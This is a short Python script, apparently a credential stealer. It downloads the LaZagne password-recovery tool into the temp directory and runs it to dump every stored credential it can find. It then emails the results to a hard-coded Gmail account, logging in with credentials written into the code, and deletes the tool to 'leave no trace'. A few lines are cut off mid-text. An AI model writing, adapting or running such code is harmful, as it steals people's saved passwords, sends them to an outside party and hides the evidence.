import requests
import subprocess
import os                                                                  import smtplib
import tempfile

def send_mail(email, password, message):
    # Function to send email via Gmail SMTP server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()  # Secure the connection
    server.login(email, password)
    # Sending the email to yourself (from, to, message)
    server.sendmail(email, email, message)
    server.quit()

def download(url):
    # Function to download a file from a specific URL
    get_response = requests.get(url)
    # Extract the file name from the URL
    file_name = url.split("/")[-1]
    # Write the content to a local file in binary mode
    with open(file_name, "wb") as out_file:                                        out_file.write(get_response.content)

# Get the system's temporary directory and change the current working dire>
temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

# Download the tool (ensure the link is a direct download link)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/l>

# Execute the tool and capture the output
# shell=True allows the command to run as if typed in CMD/Terminal
result = subprocess.check_output("lazagne.exe all", shell=True)

# Send the results via email
# Note: Gmail requires an "App Password" for this to work
send_mail("raphael99michael@gmail.com", "Raphael99@.", result)

# Remove the tool to leave no trace (clean up)
os.remove("lazagne.exe")
